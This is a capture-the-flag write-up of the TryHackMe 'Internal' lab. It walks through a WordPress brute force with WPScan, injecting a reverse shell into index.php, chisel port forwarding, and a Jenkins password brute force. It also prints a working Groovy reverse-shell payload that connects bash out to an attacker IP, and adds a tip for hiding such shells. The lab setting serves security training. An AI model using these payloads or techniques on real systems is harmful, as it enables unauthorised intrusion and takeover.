@@ -1,0 +1,92 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/" rel="category tag">TryHackME</a></span>            </div>
+            <h1 class="post-title entry-title">Internal TryHackMe Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/internal-tryhackme-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-11-13T07:59:20+00:00">November 13, 2020</time><time class="updated" datetime="2025-06-25T12:51:34+00:00">June 25, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today we’re going to solve another boot2root challenge called “Internal”. It’s available at TryHackMe for penetration testing practice. This lab is not difficult if we have the right basic knowledge to break the labs and are attentive to all the details we find during the reconnaissance. The credit for making this lab goes to <span style="color: #0000ff;"><strong>TheMayor</strong>.</span> Let’s get started and learn how to break it down successfully.</span></p>
+<p><span style="color: #000000;">Level: <strong>Hard</strong></span></p>
+<p><span style="color: #000000;">Since these labs are available on the <strong>TryHackMe</strong> website.</span></p>
+<h3><span style="color: #800000;">Penetration Testing Methodology</span></h3>
+<p><span style="color: #000000;"><strong>Reconnaissance</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Dirsearch</span></li>
+<li><span style="color: #000000;">WPScan</span></li>
+<li><span style="color: #000000;">Linpeas</span></li>
+<li><span style="color: #000000;">Chisel</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploiting</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Template infection with a reverse shell.</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Credentials in hidden and unencrypted files</span></li>
+<li><span style="color: #000000;">Bruteforce login Jenkins and abuse of console scripts</span></li>
+</ul>
+<ul>
+<li><span style="color: #000000;">Capture the flag</span></li>
+</ul>
+<h3><span style="color: #800000;">Walkthrough</span></h3>
+<h3><span style="color: #800000;">Reconnaissance</span></h3>
+<p><span style="color: #000000;">We put the IP address in “<strong>etc/hosts</strong>” file and execute <strong>nmap</strong>.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- -A internal.try</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jTI9qO721VU/X645vorkJII/AAAAAAAAqho/TRBXGtlheEwVkJ2x6v08ixpfhHFPOyFngCLcBGAsYHQ/s16000/1.png"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">We start by accessing the web resource, we find the default page of <strong>Apache2/Ubuntu</strong> without any hint.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9X8_40XgaAc/X6451AbgOJI/AAAAAAAAqhs/yFkDqLuvJq4Yjf7S5hJe0bxiK3C0Ow46ACLcBGAsYHQ/s16000/2.png"/></span></p>
+<p><span style="color: #000000;">It is time to start <strong>dirsearch</strong>, in a moment we are going to list two directories that will call our attention.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-r0FdBFONxLo/X6455n1tgWI/AAAAAAAAqhw/TyGSmQ3KQ2oJD2-3VOZxqbx4Jc2FgiSsgCLcBGAsYHQ/s16000/3.png"/></span></p>
+<p><span style="color: #000000;">We provide a list of WordPress installations on the server with very little detail.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-moq6D0p6P1Q/X645-dSAMCI/AAAAAAAAqh0/ADop9_EwsBwvKwKGINXN3BmN1ItImoZRQCLcBGAsYHQ/s16000/4.png"/></span></p>
+<p><span style="color: #000000;">WPScan is what we utilize for brute force and user enumeration. We will receive credentials to gain administrator access.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wpscan --url internal.try -P /root/Tools/Dics/rockyou.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-utuJjeVEHbs/X646DY8eeUI/AAAAAAAAqh8/vxtWp1yHP_04WgXmQKsTV91VeV5hGHj2gCLcBGAsYHQ/s16000/5.png"/></span></p>
+<h3><span style="color: #800000;">Exploiting</span></h3>
+<p><span style="color: #000000;">Taking advantage of our privileges, we will edit the file “<strong>index.php</strong>” and insert our reverse shell. An annotation, this is something “<strong>noisy</strong>“, in a real scenario, an attacker would hide this code in another less usable file, or would create a condition with PHP so that the reverse shell would only be executed on an IP address, flag by GET, etc… in MD5 (for example).</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ntqObQ899-I/X646Ie3PKtI/AAAAAAAAqiE/v1_WfiHCQ_othRZ3c2Tm90PAn6FytbV7QCLcBGAsYHQ/s16000/6.png"/></span></p>
+<p><span style="color: #000000;">And we will have a connection inside the machine. We execute our two favorite commands to have an interactive shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pj_37lx6DRg/X646NdaQDLI/AAAAAAAAqiM/2zNHK9Bpq50wkA7QhYjOUTNupE0zHm0FgCLcBGAsYHQ/s16000/7.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation (user “aubreanna”)</span></h3>
+<p><span style="color: #000000;">After performing many actions for the enumeration, we found a text file that seems interesting.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WmyF4DudLts/X646SCS46OI/AAAAAAAAqiQ/XhzPzcJMCdE-BgDzXF8OB9mgNKXinhcMgCLcBGAsYHQ/s16000/8.png"/></span></p>
+<p><span style="color: #000000;">We read it and it contains the credentials of the <strong>aubreanna</strong> user.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kRJ7HVT2ulI/X646Xz6PHjI/AAAAAAAAqiY/56tqXLQq_vYvT2qBj8oSn5RLzzFbhS1AQCLcBGAsYHQ/s16000/9.png"/></span></p>
+<p><span style="color: #000000;">We authenticate with the user “<strong>aubreanna</strong>” and by <strong>SSH</strong> and we access his home and read the flag of <strong>“user.txt</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-q6hL_OEqD6o/X646c8yUgeI/AAAAAAAAqik/rphXcNXsL5wGmt2jVVqfCqVtuNJ38eaPACLcBGAsYHQ/s16000/10.png"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation (root)</span></h3>
+<p><span style="color: #000000;">We find the file “<strong>jenkins</strong>.txt”, read it and it gives us the clue that the service is running internally on an <u>IP address on port 8080</u>.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mnaQpPphemU/X646i28yg8I/AAAAAAAAqio/x777BXAPQ74H6ACBybMBA7pKJfxJ9Y2IACLcBGAsYHQ/s16000/11.png"/></span></p>
+<p><span style="color: #000000;">I used “<strong><a style="color: #000000;" href="https://github.com/jpillora/chisel">chisel</a></strong>” to port forward my Kali machine to port 9000.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-syFia0pntw0/X646n9uHX3I/AAAAAAAAqiw/DjQLCMES8TAvgckGWAB_fTfQ7GFNiAfiACLcBGAsYHQ/s16000/12.png"/></span></p>
+<p><span style="color: #000000;">We locate a Jenkins service on the website, and we attempt using the credentials we have so far (WordPress, wp-config.php, mysql, etc.), but nothing seems to work.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Wy8QznjnL3I/X646tDDbO6I/AAAAAAAAqi4/IyDvOzFKtpgp7zcU_f-90QY08jDLom8LwCLcBGAsYHQ/s16000/13.png"/></span></p>
+<p><span style="color: #000000;">Using a dictionary of the most popular passwords, we employ Burp’s intruder. We will use the password’s “Length” to identify it.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4iuNHcHk5kQ/X646xrYcYiI/AAAAAAAAqi8/EqebmqEMpbskj6OoAZ5-pqT7A4YHiqQkQCLcBGAsYHQ/s16000/14.png"/></span></p>
+<p><span style="color: #000000;"><strong>Jenkins</strong> has a scripting console, in it, we will insert the code below and keep a <strong>netcat</strong> listening in our machine.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-y6amaeS15y4/X6462qiSycI/AAAAAAAAqjA/OmpYqMgteI89NDGwE5FyYLUGQWV4oBWUgCLcBGAsYHQ/s16000/15.png"/></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">String host="10.9.5.154";
+int port=6666;
+String cmd="bash";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+</pre>
+<pre class="lang:default decode:true"><span style="color: #800000;"><strong><u>Exploit code:</u></strong></span></pre>
+<p><span style="color: #000000;">If we have done it right, we will get access to the machine:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-I6kgTLeCWvw/X646-0hTabI/AAAAAAAAqjM/q1vCysAUtkM_-Dhi00_rFAa1qJh4ihTAQCLcBGAsYHQ/s16000/16.png"/></span></p>
+<p><span style="color: #000000;">We repeat the move, look again for .txt files and find one called “<strong>note.txt</strong>“.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-y5vz0NpT1fs/X647EuTPzqI/AAAAAAAAqjU/0EbyMaXhbUsiQrFQr8S70_2Glkb45fBQwCLcBGAsYHQ/s16000/17.png"/></span></p>
+<p><span style="color: #000000;">We read the file and find the <strong>root</strong> credentials!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-xzhuMKfcWB8/X647KyFtf4I/AAAAAAAAqjY/0t-ZliVf-GoE2VJUzQsHALnJNrbtV3eSwCLcBGAsYHQ/s16000/18.png"/></span></p>
+<p><span style="color: #000000;">With the credentials in our possession, we authenticate ourselves as root and read the flag.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1uPlCuYjiBA/X647PbNRmKI/AAAAAAAAqjg/gyQJHO-QUr4BKMr2DQuTJ67G3PetuFOWQCLcBGAsYHQ/s16000/19.png"/></span></p>
+<p><span style="color: #000000;">Hope you have enjoyed this TryHackMe Write-up. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/tryhackme/">Link</a> </strong><span style="color: #000000;">for more TryHackMe CTF’s.</span></p>
+<p><span style="color: #000000;"><strong>Author</strong>: <strong>David Utón</strong> is Penetration Tester and security auditor for Web applications, perimeter networks, internal and industrial corporate infrastructures, and wireless networks. Contact on <span style="color: #0000ff;"><strong>LinkedIn </strong></span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/David_Uton">Twitter</a></strong></span>.</span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
